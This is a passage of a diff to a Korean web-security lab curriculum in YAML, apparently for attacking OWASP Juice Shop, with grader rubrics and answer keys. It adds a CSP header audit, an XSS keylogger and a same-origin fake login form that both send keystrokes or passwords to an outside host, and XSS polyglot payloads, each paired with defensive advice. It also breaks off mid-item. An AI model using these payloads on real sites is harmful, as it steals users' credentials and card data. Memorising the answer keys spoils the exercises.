+      echo "$CSP" | grep -oE "(unsafe-inline|unsafe-eval|\*|data:|http:|'unsafe-[a-z]+')" \
+        | sort -u | sed 's/^/  ★ 약점: /'
+    fi
+
+    # 4. Google CSP Evaluator 명령 (또는 web 직접)
+    echo ""
+    echo "=== 4. CSP Evaluator 외부 시뮬 ==="
+    echo "CSP 정책을 https://csp-evaluator.withgoogle.com/ 에 붙여넣어 자동 등급 확인"
+    echo "권장: A+ 등급 = nonce 또는 strict-dynamic + 'self' + no unsafe-*"
+    ```
+
+    ## 📋 확인 사항
+
+    - Juice Shop 의 CSP 헤더 존재 여부 + 정책 내용
+    - 약점 패턴:
+      - `unsafe-inline` → inline `<script>` 실행 허용 (CSP 무력화)
+      - `unsafe-eval` → `eval()` / `setTimeout(string)` 허용
+      - `*` (wildcard) → 모든 외부 host 허용
+      - `data:` scheme → `<img src="data:text/html,...">` XSS
+      - `http:` (HTTPS 환경에서) → MITM 시 외부 script
+    - **추천 정책**: `default-src 'self'; script-src 'nonce-RANDOM' 'strict-dynamic';
+      object-src 'none'; base-uri 'self'; frame-ancestors 'none'`
+
+    ## 💡 왜 이걸 하는가?
+
+    CSP 는 XSS 의 *마지막 방어선* — 이전 단계 (sanitize, WAF) 우회되어도 CSP 가
+    실행 차단. OWASP A05 Security Misconfiguration + MITRE T1190 차단. Juice
+    Shop 처럼 *CSP 미설정* 은 XSS 의 완전한 노출 — 운영 web 의 default 권장 정책
+    적용 필수.
+
+    ## 🔵 Blue 측 작업
+
+    - **CSP Report-URI / Report-To** — 정책 위반 시 자동 report POST → Wazuh
+    - **CSP Report-Only 단계 도입** — 1 개월 모니터링 (FP 식별) → enforce
+    - **Mozilla Observatory** / **Google CSP Evaluator** 정기 등급 확인
+    - **Wazuh + CSP report** → XSS 시도 패턴 발견 + 대응
+
+    ## 🟣 Purple 권고 (단계별 도입)
+
+    1. **즉시**: CSP 헤더 추가 (Report-Only 모드)
+       ```
+       Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
+       ```
+    2. **1 주**: report 분석 → FP 식별 → 정책 조정
+    3. **1 개월**: Report-Only → enforce 전환
+    4. **3 개월**: nonce + strict-dynamic + Trusted Types (Chrome)
+    5. **정기**: SAST (Semgrep) + CSP Evaluator 자동 등급 모니터링
+  hint: |
+    curl -sI 의 CSP 헤더 grep + 약점 패턴 (unsafe-inline / wildcard / data:) sed.
+    Juice Shop default = CSP 미설정 또는 최소 → 운영 web 의 strict 정책 권장.
+  category: xss_defense
   points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 JWT 토큰 구조 분석을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 토큰 구조\
-    \ 분석 완료'"
-  answer_detail: JWT 토큰 구조 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  answer: |
+    echo "=== 1. CSP 헤더 ==="
+    CSP=$(curl -sI http://juice.6v6.lab/ | grep -i '^content-security-policy:')
+    echo "${CSP:-'(CSP 미설정 = critical)'}"
+    echo ""
+    echo "=== 2. 다른 보안 헤더 ==="
+    curl -sI http://juice.6v6.lab/ | grep -iE '^(x-frame|x-content-type|strict-transport|referrer-policy|permissions-policy):' | head -10
+    echo ""
+    echo "=== 3. CSP 약점 패턴 ==="
+    if [ -n "$CSP" ]; then
+      echo "$CSP" | grep -oE "(unsafe-inline|unsafe-eval|\*|data:|http:)" | sort -u | sed 's/^/  ★ /'
+    fi
+    echo ""
+    echo "CSP 분석 완료 — 권장: default-src 'self'; script-src 'nonce-XXX' 'strict-dynamic'"
+  answer_detail: |
+    Juice Shop default 의 CSP 정책 = 최소 (또는 미설정) — XSS 완전 노출. 운영 web
+    의 권장 = `default-src 'self'; script-src 'nonce-RANDOM' 'strict-dynamic';
+    object-src 'none'; base-uri 'self'`. unsafe-inline / unsafe-eval / wildcard
+    절대 금지. Mozilla Observatory 등급 A+ 목표.
   verify:
     type: output_contains
-    expect:
-    - 완료
-    - 10.20.32.80
+    expect: 'CSP\|완료'
     field: stdout
     semantic:
-      intent: JWT 토큰 구조 분석 — 3부(Header.Payload.Signature) Base64URL 디코드 후 alg·type·클레임
-        확인
+      intent: |
+        CSP 헤더 분석 + 약점 패턴 식별 + Strict CSP 권고. OWASP A05 + MITRE
+        T1190 의 마지막 방어선. Report-Only → enforce 단계 도입.
       success_criteria:
-      - JWT Base64URL 디코드 명령 또는 jwt.io 예시
-      - Header alg·Payload (iat, exp, sub) 클레임 최소 2개 해석
-      - 서명 검증 필요성 설명
+        - CSP 헤더 수집 (curl -sI grep)
+        - 약점 패턴 (unsafe-inline / wildcard / data: 등) 분석
+        - 추천 정책 (default-src 'self' + nonce + strict-dynamic) 명시
+        - Report-Only 단계 도입 권장
       acceptable_methods:
-      - echo <jwt> | cut -d. -f1 | base64 -d
-      - python jose/PyJWT 라이브러리
-      - jwt_tool --decode
-      - jwt.io 페이스트
+        - "curl -sI + grep csp"
+        - "Google CSP Evaluator API"
+        - "Mozilla Observatory 외부 점검"
+        - "Browser DevTools Security tab"
       negative_signs:
-      - Base64 디코드 없음
-      - 클레임 해석 없음
-      - 서명 개념 누락
+        - CSP 존재 여부만 확인 (정책 해석 X)
+        - 약점 패턴 분석 누락
+        - 추천 정책 (nonce / strict-dynamic) 미언급
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 토큰 구조\
-    \ 분석 완료'"
+  script: |
+    CSP=$(curl -sI http://juice.6v6.lab/ | grep -i '^content-security-policy:')
+    echo "CSP: ${CSP:-'(미설정)'}"
+    curl -sI http://juice.6v6.lab/ | grep -iE '^(x-frame|x-content-type|strict-transport|referrer-policy):' | head -5
+    [ -n "$CSP" ] && echo "$CSP" | grep -oE "(unsafe-inline|unsafe-eval|\*|data:)" | sort -u | sed 's/^/약점: /'
+    echo "CSP 분석 완료 — 권장: nonce + strict-dynamic"
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 JWT 토큰 구조 분석을(를) 수행해줘
-
-
-    [도구 권장] jwt: jwt_tool (decode/forge/none/alg confusion), curl + Authorization
-    헤더. curl 만 쓰지 말고 **jwt_tool (decode/forge/none/alg confusion)** 등 적합 도구로 호출 후
-    stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 juice.6v6.lab 의 (1) CSP 헤더 수집 (curl -sI grep) (2)
+    약점 패턴 (unsafe-inline / unsafe-eval / wildcard / data: 스킴) 식별 (3)
+    다른 보안 헤더 6종 (W01 step 4) 동시 점검 (4) 추천 정책 (default-src 'self'
+    + script-src 'nonce-RANDOM' 'strict-dynamic') 권장. Purple = Report-Only
+    1 개월 → enforce + Mozilla Observatory 정기 등급.
+# ============================================================
+# STEP 8 [RED·XSS·Exploit·Keylogger] — addEventListener keypress + 외부 exfil
+# ============================================================
 - order: 8
-  instruction: '{{WEB_IP}} 대상으로 JWT 서명 검증 우회 테스트을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    XSS 실행 후 *real-time 키로거* — addEventListener('keypress') + 외부 exfil.
+    Juice Shop 의 admin 페이지 또는 결제 페이지 에서 password / credit card 실시간 탈취.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `jwt` 에 적합한 도구: jwt_tool (decode/forge/none/alg
-    confusion), curl + Authorization 헤더. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote**
-    해야 채점 통과.'
-  hint: JWT 서명 검증 우회 테스트 관련 도구와 기법을 활용하세요.
-  category: jwt
+    ## 💻 PoC
+
+    ```html
+    <!-- Juice Shop /#/admin 에 stored XSS 가 가능했다면 -->
+    <script>
+    document.addEventListener('keypress', function(e) {
+      new Image().src = 'http://10.20.30.202:9999/?k=' + e.key
+        + '&u=' + encodeURIComponent(location.pathname);
+    });
+    </script>
+    ```
+
+    ## 📋 확인 사항
+    - addEventListener('keypress' / 'keydown' / 'input') 셋 중 가장 stealthy = keypress
+    - exfil 채널 = Image (GET, no CORS) 또는 sendBeacon (page unload 보장)
+    - input 의 password type 도 keypress event 발생 → 평문 노출
+
+    ## 💡 왜
+    MITRE T1056.001 Keylogging + T1539. XSS 가 *passive 키로거* 로 변신 — 사용자
+    가 *원본 도메인 에서 입력* 하므로 의심 안 함.
+
+    ## 🟣 Purple
+    - **Trusted Types** (Chrome) — DOM sink 강제 sanitize
+    - **CSP `script-src` strict** — inline <script> 차단
+    - **WebAuthn / FIDO** — password 자체 제거 (FIDO key 사용)
+  hint: |
+    addEventListener + Image exfil. Juice Shop 의 admin / 결제 페이지 에 stored XSS
+    가능 시 키 입력 실시간 탈취.
+  category: xss_exploit
   points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 JWT 서명 검증 우회 테스트을(를) 수행해줘\n\U0001F4CE\
-    \ 참고 (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 서명 검증\
-    \ 우회 테스트 완료'"
-  answer_detail: JWT 서명 검증 우회 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  answer: |
+    cat <<'EOF'
+    === XSS Keylogger PoC ===
+    <script>
+    document.addEventListener('keypress', function(e) {
+      new Image().src = 'http://10.20.30.202:9999/?k=' + e.key + '&u=' + location.pathname;
+    });
+    </script>
+
+    채널: addEventListener('keypress') = 가장 stealthy
+    exfil: Image (GET, no CORS) 또는 sendBeacon
+    표적: Juice Shop /#/admin 의 password field 또는 결제 폼
+
+    Purple: Trusted Types + CSP script-src strict + WebAuthn
+    EOF
+    echo "키로거 페이로드 작성 완료"
+  answer_detail: |
+    XSS 가 실행되면 keypress event listener 등록 → 모든 키 입력을 외부 exfil.
+    Juice Shop 의 admin 페이지 또는 결제 시 password / credit card 실시간 탈취.
+    MITRE T1056.001 + T1539. 운영 web 의 정답 = Trusted Types + CSP strict + WebAuthn.
   verify:
     type: output_contains
-    expect:
-    - 완료
-    - jwt
+    expect: '키로거\|keypress'
     field: stdout
     semantic:
-      intent: JWT 서명 검증 우회 — alg:none, 공개키 혼동(HS256 with RSA pubkey), 약한 HMAC 키 크래킹
+      intent: XSS keylogger — addEventListener keypress + Image exfil. T1056.001.
       success_criteria:
-      - alg:none 변조 후 서명 제거 공격 예시
-      - HS256↔RS256 알고리즘 confusion 개념
-      - jwt_tool 또는 hashcat 로 HMAC 키 brute
+        - addEventListener keypress / keydown 코드 제시
+        - exfil 채널 (Image / fetch / sendBeacon) 명시
+        - Trusted Types 또는 CSP script-src 권고
       acceptable_methods:
-      - jwt_tool <token> -X a none
-      - jwt_tool <token> -X k <pubkey.pem>
-      - hashcat -m 16500 jwt_hashes
-      - python PyJWT decode without verify
+        - "document.addEventListener('keypress', ... + Image.src)"
+        - "BeEF social_engineering module"
+        - "XSSHunter blind payload"
       negative_signs:
-      - 알고리즘 조작 없이 일반 decode 만
-      - 공개키 혼동 개념 누락
-      - 약한 키 공격 언급 없음
+        - keypress 없이 alert 만
+        - exfil 누락
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 서명 검증\
-    \ 우회 테스트 완료'"
+  script: |
+    cat <<'EOF'
+    <script>document.addEventListener('keypress', e => new Image().src='http://10.20.30.202:9999/?k='+e.key);</script>
+    Purple: Trusted Types + CSP + WebAuthn
+    EOF
+    echo "키로거 페이로드 작성 완료"
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 JWT 서명 검증 우회 테스트을(를) 수행해줘
-
-
-    [도구 권장] jwt: jwt_tool (decode/forge/none/alg confusion), curl + Authorization
-    헤더. curl 만 쓰지 말고 **jwt_tool (decode/forge/none/alg confusion)** 등 적합 도구로 호출 후
-    stdout quote.'
+  bastion_prompt: |
+    XSS keylogger PoC — addEventListener('keypress') + Image exfil. Juice Shop
+    의 admin / 결제 페이지 에서 password / credit card 실시간 탈취 시나리오.
+    MITRE T1056.001 + T1539. Purple = Trusted Types + CSP script-src strict +
+    WebAuthn.
+# ============================================================
+# STEP 9 [RED·XSS·Phishing] — 동일 도메인 가짜 로그인 폼 삽입
+# ============================================================
 - order: 9
-  instruction: '{{WEB_IP}} 대상으로 JWT 알고리즘 변조 공격을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    XSS 가 실행되면 *원본 도메인 URL bar 유지* 한 채 가짜 로그인 폼 삽입 →
+    사용자가 의심 없이 password 입력 → 외부 exfil. 동일 출처 (juice.6v6.lab) 라
+    인증서 / URL / 헤더 모두 정상 — 가장 위험한 사회공학 XSS.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `jwt` 에 적합한 도구: jwt_tool (decode/forge/none/alg
-    confusion), curl + Authorization 헤더. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote**
-    해야 채점 통과.'
-  hint: JWT 알고리즘 변조 공격 관련 도구와 기법을 활용하세요.
-  category: jwt
+    ## 💻 PoC
+
+    ```html
+    <script>
+    document.body.innerHTML = `
+      <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;padding:50px;">
+        <h2>세션 만료. 다시 로그인해주세요.</h2>
+        <form id="phish">
+          <input id="e" type="email" placeholder="email" required>
+          <input id="p" type="password" placeholder="password" required>
+          <button>로그인</button>
+        </form>
+      </div>`;
+    document.getElementById('phish').onsubmit = e => {
+      e.preventDefault();
+      new Image().src = 'http://10.20.30.202:9999/?e=' + encodeURIComponent(document.getElementById('e').value)
+        + '&p=' + encodeURIComponent(document.getElementById('p').value);
+      window.location.reload();  // 원래 페이지 복원 → 사용자 의심 X
+    };
+    </script>
+    ```
+
+    ## 📋 확인 사항
+    - URL bar = `http://juice.6v6.lab/` 정상 (사용자 의심 X)
+    - 인증서 / favicon 모두 정상
+    - 폼 submit 시 password exfil + 페이지 reload → 자연스러움
+
+    ## 💡 왜
+    동일 출처 phishing = *가장 위험한 사회공학* (MITRE T1566.003 Phishing via
+    Service). 사용자가 "URL 확인하세요" 라는 통상 보안 교육으로 차단 못 함.
+
+    ## 🟣 Purple
+    - **CSP `default-src 'self'`** + nonce — XSS 실행 자체 차단
+    - **Trusted Types** — innerHTML 사용 시 강제 sanitize
+    - **DOMPurify.sanitize()** — 모든 user input sanitize
+    - 사용자 교육 의 한계 명시 (URL 만으로 phishing 식별 불가)
+  hint: |
+    document.body.innerHTML = 가짜 로그인 폼. onsubmit 으로 exfil + reload.
+    동일 출처 라 URL bar / 인증서 정상 — 사용자 의심 X.
+  category: xss_exploit
   points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 JWT 알고리즘 변조 공격을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 알고리즘\
-    \ 변조 공격 완료'"
-  answer_detail: JWT 알고리즘 변조 공격은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  answer: |
+    cat <<'EOF'
+    === XSS 피싱 PoC (동일 출처) ===
+    <script>
+    document.body.innerHTML = `<form id=phish>
+      <input id=e type=email><input id=p type=password>
+      <button>로그인</button></form>`;
+    document.getElementById('phish').onsubmit = e => {
+      e.preventDefault();
+      new Image().src = 'http://attacker/?e=' + document.getElementById('e').value
+        + '&p=' + document.getElementById('p').value;
+      window.location.reload();
+    };
+    </script>
+
+    위험: URL bar = juice.6v6.lab 정상 → 사용자 의심 X
+    MITRE T1566.003 Phishing via Service
+    Purple: CSP strict + Trusted Types + DOMPurify
+    EOF
+    echo "피싱 페이로드 작성 완료"
+  answer_detail: |
+    XSS 가 실행되면 document.body.innerHTML 으로 가짜 로그인 폼 삽입 → 동일 출처
+    라 URL bar 정상 → 사용자 의심 X. 폼 submit 시 password exfil + reload 로
+    원래 페이지 복원. MITRE T1566.003. *사용자 교육의 한계* — URL 확인 통상 보안
+    교육으로 차단 못 함. CSP / Trusted Types / DOMPurify 가 본질적 방어.
   verify:
     type: output_contains
-    expect: 완료
+    expect: '피싱\|phish'
     field: stdout
     semantic:
-      intent: JWT 알고리즘 변조 — header alg 를 none/HS256/RS256 간 변조 후 서명 재계산·무효화
+      intent: XSS phishing — 동일 출처 가짜 로그인 폼. T1566.003.
       success_criteria:
-      - Header alg 변경 방법(base64 재인코딩) 설명
-      - 서버가 alg 값을 신뢰하면 인증 우회 성공
-      - '방어: alg 화이트리스트, 서명 알고리즘 서버 강제'
-      acceptable_methods:
-      - jwt_tool -X 옵션
-      - python jose 로 수동 재서명
-      - Burp JWT Editor extension
-      - curl -H Authorization:Bearer <forged>
-      negative_signs:
-      - Header 변조 시도 없음
-      - 서명 재생성 단계 누락
-      - 방어 기법 없음
+        - document.body.innerHTML 가짜 폼 삽입 PoC
+        - exfil + reload 시나리오
+        - 동일 출처 의 사용자 인지 한계
+      acceptable_methods: ["innerHTML form", "BeEF social_engineering"]
+      negative_signs: ["폼 없이 개념만"]
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'JWT 알고리즘\
-    \ 변조 공격 완료'"
+  script: |
+    echo "<script>document.body.innerHTML='<form id=p><input type=password id=pw></form>'; document.getElementById('p').onsubmit=e=>{new Image().src='http://attacker/?pw='+document.getElementById('pw').value};</script>"
+    echo "MITRE T1566.003 / Purple: CSP + Trusted Types + DOMPurify"
+    echo "피싱 페이로드 작성 완료"
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 JWT 알고리즘 변조 공격을(를) 수행해줘
-
-
-    [도구 권장] jwt: jwt_tool (decode/forge/none/alg confusion), curl + Authorization
-    헤더. curl 만 쓰지 말고 **jwt_tool (decode/forge/none/alg confusion)** 등 적합 도구로 호출 후
-    stdout quote.'
+  bastion_prompt: |
+    XSS phishing PoC — document.body.innerHTML 으로 가짜 로그인 폼 삽입 +
+    onsubmit exfil + reload. 동일 출처 의 위험 (URL bar 정상). MITRE T1566.003.
+    Purple = CSP strict + Trusted Types + DOMPurify + 사용자 교육 한계 명시.
+# ============================================================
+# STEP 10 [RED·XSS·Framework] — Angular / React / Vue 별 XSS 벡터 + default 보호 한계
+# ============================================================
 - order: 10
-  instruction: '{{WEB_IP}} 대상으로 패스워드 리셋 취약점 분석을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    Modern JS framework 별 XSS 벡터 + default 보호 한계 표 작성. Juice Shop 의
+    Angular 의 `bypassSecurityTrustHtml` 처럼 framework 가 *trust* 옵션 제공 →
+    의도적 사용 시 XSS 직접 노출.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
-    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 패스워드 리셋 취약점 분석 관련 도구와 기법을 활용하세요.
-  category: auth
+    ## 📋 프레임워크별 XSS 표
+
+    | Framework | default 보호 | 취약 API (의도적 사용 시) | 방어 |
+    |-----------|------------|-----------------------|------|
+    | Angular | template `{{ }}` HTML escape | `[innerHTML]`, `bypassSecurityTrustHtml/Script/Url/ResourceUrl/Style` | DomSanitizer.sanitize() 만 사용 |
+    | React | JSX `{...}` HTML escape | `dangerouslySetInnerHTML={{__html: ...}}` | DOMPurify.sanitize() + Trusted Types |
+    | Vue | mustache `{{ }}` HTML escape | `v-html` directive | DOMPurify.sanitize() |
+    | Svelte | `{...}` HTML escape | `{@html ...}` | sanitize-html npm |
+    | jQuery (legacy) | 없음 | `.html()`, `.append()` | jQuery deprecate, modern framework 전환 |
+
+    ## 💻 검증 명령
+
+    ```bash
+    # Juice Shop main JS 의 bypassSecurityTrust 호출 횟수
+    MAIN=$(curl -s http://juice.6v6.lab/ | grep -oE 'main-[a-zA-Z0-9._-]+\.js|main\.js' | head -1)
+    echo "main JS: ${MAIN}"
+    echo ""
+    echo "=== Angular trust pipe 호출 통계 ==="
+    curl -s "http://juice.6v6.lab/${MAIN}" 2>/dev/null \
+      | grep -oE 'bypassSecurityTrust[A-Za-z]+' | sort | uniq -c | sort -rn
+
+    # React / Vue 시뮬 (Juice Shop 은 Angular 만 사용)
+    echo ""
+    echo "=== framework default 보호 한계 ==="
+    cat <<'EOF'
+    Angular: {{}} 안전, [innerHTML] / bypassSecurityTrust* 위험
+    React  : {} 안전, dangerouslySetInnerHTML 위험
+    Vue    : {{}} 안전, v-html 위험
+    EOF
+    echo "framework XSS 분석 완료"
+    ```
+
+    ## 💡 왜
+
+    Modern framework 의 default 가 안전 하지만 *trust API* 가 의도적 사용 시
+    XSS 직접 노출. Juice Shop 의 main challenge = Angular bypassSecurityTrustHtml
+    실제 사용. OWASP A03 + MITRE T1027.
+
+    ## 🟣 Purple
+    - framework 의 trust API 사용 금지 (코드 review + ESLint rule + Semgrep)
+    - DOMPurify.sanitize() 강제 (모든 user input)
+    - Trusted Types (Chrome) — DOM sink 강제 sanitize
+  hint: |
+    Juice Shop main JS 의 bypassSecurityTrust 호출 통계 grep. 5 framework 표 + 각
+    default 보호 + 취약 API + 방어 라이브러리.
+  category: xss_advanced
   points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 패스워드 리셋 취약점 분석을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 리셋\
-    \ 취약점 분석 완료'"
-  answer_detail: 패스워드 리셋 취약점 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  answer: |
+    MAIN=$(curl -s http://juice.6v6.lab/ | grep -oE 'main-[a-zA-Z0-9._-]+\.js|main\.js' | head -1)
+    echo "=== Angular bypassSecurityTrust 호출 통계 ==="
+    curl -s "http://juice.6v6.lab/${MAIN}" 2>/dev/null \
+      | grep -oE 'bypassSecurityTrust[A-Za-z]+' | sort | uniq -c | sort -rn | head -5
+    echo ""
+    cat <<'EOF'
+    === framework XSS 비교 표 ===
+    Angular: {{}} 안전 / [innerHTML] + bypassSecurityTrust* 위험 → DomSanitizer.sanitize()
+    React  : {} 안전 / dangerouslySetInnerHTML 위험 → DOMPurify + Trusted Types
+    Vue    : {{}} 안전 / v-html 위험 → DOMPurify
+    Svelte : {...} 안전 / {@html ...} 위험 → sanitize-html
+    jQuery : .html() 위험 → modern framework 전환
+    EOF
+    echo "프레임워크 XSS 분석 완료"
+  answer_detail: |
+    Juice Shop 의 Angular main JS 에 bypassSecurityTrustHtml/Url 등 호출 다수
+    (의도된 challenge). 모든 modern framework 가 *default 안전* + *trust API
+    위험* 패턴. ESLint rule + Semgrep 으로 코드 review + DOMPurify + Trusted Types.
   verify:
     type: output_contains
-    expect:
-    - 완료
-    - http_request
-    - 10.20.32.80
+    expect: '프레임워크\|bypassSecurityTrust'
     field: stdout
     semantic:
-      intent: 패스워드 리셋 취약점 — 리셋 토큰 추측·재사용·호스트헤더 변조로 피싱 링크 주입
+      intent: framework 별 XSS 벡터 + default 보호 한계 + Trust API 위험.
       success_criteria:
-      - 리셋 토큰 엔트로피 분석 (짧거나 순차적이면 취약)
-      - Host 헤더 변조로 리셋 링크 도메인 탈취 가능성 테스트
-      - 토큰 만료·1회 사용·이메일 인증 필수 방어 언급
-      acceptable_methods:
-      - curl -H Host:evil.com /reset
-      - 여러 리셋 요청 후 토큰 비교
-      - Burp Collaborator 로 콜백 수신
-      - python requests 로 자동 재사용 테스트
-      negative_signs:
-      - 토큰 엔트로피 분석 없음
-      - Host 헤더 공격 개념 부재
-      - 방어 언급 없음
+        - Angular / React / Vue 중 최소 2 framework + 취약 API 명시
+        - Juice Shop Angular trust 호출 grep
+        - DOMPurify 또는 Trusted Types 권고
+      acceptable_methods: ["framework 별 표", "main JS grep"]
+      negative_signs: ["framework 1 가지만"]
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 리셋\
-    \ 취약점 분석 완료'"
+  script: |
+    MAIN=$(curl -s http://juice.6v6.lab/ | grep -oE 'main-[a-zA-Z0-9._-]+\.js|main\.js' | head -1)
+    curl -s "http://juice.6v6.lab/${MAIN}" 2>/dev/null | grep -oE 'bypassSecurityTrust[A-Za-z]+' | sort | uniq -c | head -5
+    echo "Angular/React/Vue: trust API 위험 → DOMPurify + Trusted Types"
+    echo "프레임워크 XSS 분석 완료"
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 패스워드 리셋 취약점 분석을(를) 수행해줘
-
-
-    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
-    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    framework 별 XSS 벡터 표 — Angular bypassSecurityTrust* / React
+    dangerouslySetInnerHTML / Vue v-html / Svelte {@html ...} / jQuery .html()
+    + 각 default 보호 + 방어 라이브러리 (DOMPurify / Trusted Types). Juice Shop
+    main JS 의 bypassSecurityTrust 호출 grep 통계.
+# ============================================================
+# STEP 11 [RED·XSS·Polyglot] — 여러 컨텍스트 동시 실행 페이로드
+# ============================================================
 - order: 11
-  instruction: '{{WEB_IP}} 대상으로 2FA 우회 가능성 분석을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    Polyglot XSS = 하나의 payload 가 여러 HTML/JS/CSS context 에서 동시에 실행.
+    공격자가 *어떤 context 에 inject 되는지 모를 때* 범용 사용. PortSwigger 의
+    유명 polyglot 3 가지 + 각 구조 분석.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
-    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 2FA 우회 가능성 분석 관련 도구와 기법을 활용하세요.
-  category: auth
+    ## 💻 Polyglot Payload
+
+    ```
+    [P1] PortSwigger 고전 polyglot (HTML + attribute + JS string + URL):
+    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+    [P2] 단순 polyglot (HTML element + JS):
+    "'><svg onload=alert(1)//
+
+    [P3] mXSS (mutation XSS — DOMPurify 우회):
+    <img src=x onerror="alert(1)//
+    ```
+
+    ## 📋 컨텍스트 매핑
+
+    | context | 위 polyglot 의 실행 부분 |
+    |---------|----------------------|
+    | HTML body | `<svg onload=alert()>` 부분 |
+    | attribute (value=) | `"oncliCk=alert()` 부분 |
+    | JS string (var x='...') | `';alert();//` 부분 |
+    | URL href / src | `javascript:alert()` 부분 |
+    | CSS | `/*...*/` 주석 + 다음 컨텍스트 종료 |
+
+    ## 💻 시도 (Juice Shop)
+
+    ```bash
+    curl -s -G --data-urlencode \
+      'q=jaVasCript:/*-/*`/*\`/*'\''/*"/**/(/* */oNcliCk=alert() )//' \
+      http://juice.6v6.lab/rest/products/search | head -c 200
+    ```
+
+    ## 💡 왜
+    XSS payload 가 *어떤 context* 에 들어갈지 사전 불명 시 polyglot 이 success rate ↑.
+    PortSwigger 의 polyglot 은 5+ context 동시 cover. OWASP A03 + MITRE T1027.
+
+    ## 🟣 Purple
+    - **whitelist sanitize** (DOMPurify) — context 무관 모든 HTML strip
+    - **CSP `script-src 'self'`** — inline polyglot 차단
+    - **Trusted Types** — DOM sink 강제 sanitize
+  hint: |
+    PortSwigger polyglot 의 단일 payload 가 HTML/attr/JS/URL/CSS 5 context cover.
+    DOMPurify + CSP 가 본질적 방어.
+  category: xss_advanced
   points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 2FA 우회 가능성 분석을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '2FA 우회 가능성\
-    \ 분석 완료'"
-  answer_detail: 2FA 우회 가능성 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  answer: |
+    cat <<'EOF'
+    === XSS Polyglot 3 가지 ===
+
+    [P1] PortSwigger 고전:
+      jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
+
+    [P2] 단순 (svg onload):
+      "'><svg onload=alert(1)//
+
+    [P3] mXSS (DOMPurify 우회):
+      <img src=x onerror="alert(1)//
+
+    === 컨텍스트 cover ===
+    HTML body / attribute / JS string / URL href / CSS — 5 context 동시 실행
+    공격자가 inject context 모를 때 범용 사용
+
+    Purple: DOMPurify + CSP + Trusted Types
+    EOF
+    echo "Polyglot 작성 완료"
+  answer_detail: |
+    PortSwigger polyglot 은 5+ context (HTML/attr/JS/URL/CSS) 동시 실행 — 공격자
